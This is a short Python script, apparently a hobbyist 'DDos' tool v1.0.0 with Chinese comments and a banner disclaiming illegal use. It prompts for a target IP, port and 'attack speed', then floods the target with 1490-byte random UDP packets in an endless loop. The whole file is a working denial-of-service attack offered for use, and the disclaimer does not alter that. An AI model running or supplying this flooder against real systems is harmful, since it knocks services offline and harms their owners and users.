import socket
import time
import random
import os
os.system("clear")
os.system("figlet DDos")
print(" ____________") 
print("|   ddos    |")
print("|  v1.0.0   |")
print("| 作者hcymc |")
print("|___________|")
print("|请勿用于非法用途|")
      
def send_packets(ip, port, speed):
    # 创建一个UDP套接字
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # 设置套接字超时时间
    s.settimeout(1)

    # 生成随机数据包
    sj = random._urandom(1490)

 
    try:
        while True:
            # 发送数据包到指定的IP和端口
            s.sendto(sj, (ip, port))

            # 打印发送成功的消息
            print(f"已成功发送到 {ip}:{port}")

            # 暂停一段时间，控制发送速度
            time.sleep(1 / speed)

    except KeyboardInterrupt:
        # 用户按下Ctrl+C时关闭套接字
        print("\n程序已终止")
        s.close()

# 获取用户输入的IP、端口和发包速度
ip = input("请输入目标IP地址：")
port = int(input("请输入目标端口号："))
speed = float(input("请输入攻击速度（包/秒）："))

# 调用发送数据包的函数
send_packets(ip, port, speed)
